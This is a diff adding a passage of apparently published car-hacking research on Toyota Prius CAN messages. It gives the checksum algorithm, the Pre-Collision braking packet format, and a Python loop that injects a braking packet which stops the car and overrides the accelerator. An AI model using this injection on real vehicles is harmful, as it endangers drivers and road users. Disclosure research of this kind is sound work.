@@ -1,0 +1,82 @@
+The PCS sent a CAN message with ID 0x283 to apply the brakes if the system thought an accident was
+inevitable. 
+
+Checksum - Toyota
+Many CAN messages implemented by the Toyota Prius contain a message checksum
+in the last byte of the data. While not all messages have a checksum, a vast majority of
+important CAN packets contain one. The algorithm below is used to calculate the
+checksum.
+Checksum = (IDH + IDL + Len + Sum(Data[0] – Data[Len-2])) & 0xFF
+The checksum value is then placed in Data[Len - 1] position.
+For example, the following Lane Keep Assist (LKA) packet has a check sum of 0xE3,
+which is derived by summing 02, E4, 05, F8, 00, 00, 00:
+IDH: 02, IDL: E4, Len: 05, Data: F8 00 00 00 E3.
+Packets that do NOT have a correct checksum will be completely ignored by the ECUs
+on the CAN Bus for which the message is intended. 
+
+
+Braking - Toyota
+The Toyota Prius we purchased had the optional Pre-Collision System (PCS), which
+aids the driver in the event of an accident. This system contains many components that
+are used to the monitor the state of the car and its surroundings.
+One specific feature was isolated when attempting to find CAN packets that could be
+used to control the physical state of the automobile. While in cruise control the car uses
+radar to determine if it is approaching a vehicle going slower than the current pace. If
+the vehicle ahead of the Prius is going slower than your current speed, the car will apply
+some pressure to brakes, slowing the automobile down.
+Also, the Pre-Collision System monitors the state of objects ahead of you. It will attempt
+to determine if you are going to collide with something in front of you, say a car that has
+stopped abruptly while you were not paying attention. If this is the case, the Prius will
+audibly alert the driver and apply the brakes, regardless of the state of the acceleration
+peddle, unlike the braking done during cruise control.
+We used our monitoring software to isolate a single CAN ID that is responsible for
+braking (and potentially acceleration while in cruise control). The format of the packet is:
+IDH: 02, IDL: 83, Len: 07, Data: CN 00 S1 S2 ST 00 CS
+CN = Counter that iterates from 00-80
+S1 = Speed value one
+S2 = Speed value two
+ST = The current state of the car
+ 00 => Normal
+ 24 => Slight adjustments to speed
+ 84 => Greater adjustments to speed 
+  8C => Forcible adjustments to speed
+CS = Checksum
+The S1 and S2 values are combined to create 16-bit integer. When the integer is
+negative (8000-FFFF) then the packet is designated for slowing down the automobile
+(i.e. braking). When the value is positive 0000-7FFF then the packet is known to be
+used when accelerating (Using this packet for acceleration only appears to happen
+during cruise control and could not be reproduced).
+While cruise control acceleration could not be achieved, the Pre-Collision System autobraking
+packet could be sent at any time to slow down or even completely stop the car.
+For example, the following packet, when sent continuously, will stop the car and prevent
+the automobile from accelerating even when the gas pedal is fully depressed:
+IDH: 02, IDL: 83, Len: 07, Data: 61 00 E0 BE 8C 00 17
+To make this packet work you need to increment the counter just as the ECU would do,
+otherwise the Pre-Collision System will detect an error and stop listening to the packets
+being sent. The code below uses PyEcom to create an infinite loop that will increment
+the counter, fix the checksum, and play the appropriate braking packet on the CAN bus:
+ecom = PyEcom('Debug\\ecomcat_api')
+ecom.open_device(1,37440)
+brake_sff_str = "IDH: 02, IDL: 83, Len: 07, Data: 61 00 E0 BE 8C
+00 17"
+brake_sff = SFFMessage()
+ecom.mydll.DbgLineToSFF(brake_sff_str, pointer(brake_sff))
+print "Starting to send msgs"
+while(1):
+ brake_sff.data[0] += 1 & 0x7F
+ ecom.mydll.FixChecksum(pointer(brake_sff))
+ ecom.mydll.write_message(ecom.handle, pointer(brake_sff))
+ time.sleep(.001)
+
+See video braking.mov. 
+
+Acceleration - Toyota
+The Toyota Prius, unlike the Ford, does not directly connect the accelerator pedal to the
+Engine Control Module / Throttle Body Controls. Instead, the Power Management
+Control ECU receives the physical signals from the accelerator pedal and converts the
+information into CAN packets to bet sent to the ECM, as described in the CAN v1 and
+CAN v2 to/from link in the Automobiles section above. 
+
+http://illmatics.com/car_hacking.pdf
+
+ 
